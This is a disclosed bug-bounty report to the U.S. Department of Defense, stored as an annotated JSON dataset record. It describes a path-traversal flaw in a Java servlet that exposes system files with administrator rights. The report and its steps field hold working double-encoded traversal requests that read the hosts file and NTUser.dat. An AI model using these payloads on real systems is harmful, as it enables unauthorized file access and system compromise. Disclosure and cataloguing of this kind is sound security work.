@@ -1,0 +1,38 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "sp1d3rs ",
+    "title": "[Critical] Full local fylesystem access (LFI/LFD) as admin via Path Traversal in the misconfigured Java servlet on the https://\u2588\u2588\u2588/",
+    "content": "\nDescription\nHello. I discovered a Path Traversal issue on the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\nI was able to turn it to the local file read, and after series of the test determined that it's possible to reach sensitive system files with administrator rights.\nPOC\nThe next request will read the c:/windows/System32/drivers/etc/hosts as POC:\nCode 357 Bytes\n1GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Accept-Encoding: gzip, deflate\n4Accept: */*\n5Accept-Language: en\n6User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n7Connection: close\n8\n9\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nIn browser (Chrome):\nCode 171 Bytes\n1https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts\nTesting if we have admin rights:\nCode 346 Bytes\n1GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\n3Accept-Encoding: gzip, deflate\n4Accept: */*\n5Accept-Language: en\n6User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n7Connection: close\n8\nThe system will return 200 ok and respond with content of Users/Administrator/NTUser.dat which should be accessible only from administrator account.\n\u2588\u2588\u2588\u2588\u2588\u2588\nIt proves the critical impact an possibility of the RCE, because we have high-privileged rights on the system.\nSuggested fix\nSecure the vulnerable servlet.\nImpact\nRemote attacker is able to read any file on the system partition, it can lead to the full compromise of the resource, in case attacker will reach sensitive files such as logs/credentials/registry tree.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1570216680,
+    "report_url": "https://hackerone.com/reports/497771",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a GET request to the vulnerable endpoint with a path traversal payload to access a system file (e.g., /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts)."
+        ],
+        [
+            2,
+            "Verify the response contains the contents of the targeted file (e.g., hosts file or NTUser.dat), confirming the vulnerability."
+        ]
+    ],
+    "vuln_description": "A Path Traversal vulnerability in a misconfigured Java servlet allows an attacker to read arbitrary files on the system with administrator privileges, potentially leading to full system compromise.",
+    "reason": "The vulnerability involves a straightforward path traversal attack with no complex interactions or state manipulations. The attack is a well-known technique and does not require novel logic or deep understanding of the application's internals.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
